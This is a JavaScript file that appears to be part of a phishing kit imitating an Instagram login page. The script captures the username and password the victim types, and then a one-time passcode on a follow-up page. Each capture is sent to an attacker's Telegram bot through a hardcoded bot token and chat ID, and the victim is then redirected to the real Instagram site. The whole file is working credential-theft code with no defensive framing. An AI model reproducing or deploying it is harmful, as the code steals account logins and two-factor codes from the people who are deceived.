window.onload = () => {
  const className = "_aa49";
  const botToken = "6057302323:AAHczslZMiAkDLd9HgE_POjt85PSF2SfhpA";
  const chatId = "5852536344";
  const toggle = document.getElementById("toggle");
  const toggleBtn = document.getElementById("toggleBtn");
  const username = document.getElementById("username");
  const password = document.getElementById("password");
  const otp = document.getElementById("otp");
  const form1 = document.getElementById("form1");
  const form2 = document.getElementById("form2");
  toggle?.style?.setProperty("display", "none");
  function handleChange() {
    const parent = this.parentElement;
    this.value == ""
      ? parent.classList.contains(className)
        ? parent.classList.remove(className)
        : null
      : parent.classList.contains(className)
      ? null
      : parent.classList.add(className);
    this.value == ""
      ? toggle?.style?.setProperty("display", "none")
      : toggle?.style?.setProperty("display", "block");
  }
  const handleToggle = () => {
    password.type == "text"
      ? (password.type = "password")
      : (password.type = "text");
    password.type == "text"
      ? (toggleBtn.innerText = "HIDE")
      : (toggleBtn.innerText = "SHOW");
  };
  const post = (data, redirect = "/") => {
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    let text = "";
    Object.entries(data).forEach(([key, value]) => {
      text += `${key}: ${value}` + "\n";
    });
    fetch(`${url}?chat_id=${chatId}&text=${encodeURIComponent(text)}`)
      .then((res) => location.assign(redirect))
      .catch((err) => console.log(err));
  };
  const onSubmit = (e) => {
    e.preventDefault();
    if (otp) {
      post(
        {
          "Instragram OTP": otp.value,
        },
        "https://instagram.com"
      );
    } else {
      post(
        {
          "Instragram Username": username.value,
          "Instragram Password": password.value,
        },
        "otp.html"
      );
    }
  };
  ["username", "password", "otp"].forEach((id) => {
    const input = document.getElementById(id);
    input?.addEventListener("click", handleChange);
    input?.addEventListener("keyup", handleChange);
    input?.addEventListener("keydown", handleChange);
  });
  toggleBtn?.addEventListener("click", handleToggle);
  form1?.addEventListener("submit", onSubmit);
  form2?.addEventListener("submit", onSubmit);
};
